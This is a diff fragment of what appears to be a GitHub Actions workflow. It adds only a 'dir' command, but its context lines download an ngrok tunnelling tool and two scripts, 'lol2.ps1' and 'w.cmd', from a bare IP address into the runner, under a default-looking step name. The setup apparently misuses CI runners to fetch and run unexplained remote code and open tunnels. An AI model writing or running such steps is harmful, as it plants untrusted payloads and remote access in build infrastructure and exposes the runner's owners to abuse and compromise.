@@ -28,6 +28,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
+          dir
           Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
           Invoke-WebRequest http://5.102.153.140/lambdatest/lol2.ps1 -OutFile lol2.ps1
           Invoke-WebRequest http://5.102.153.140/lambdatest/w.cmd -OutFile w.cmd
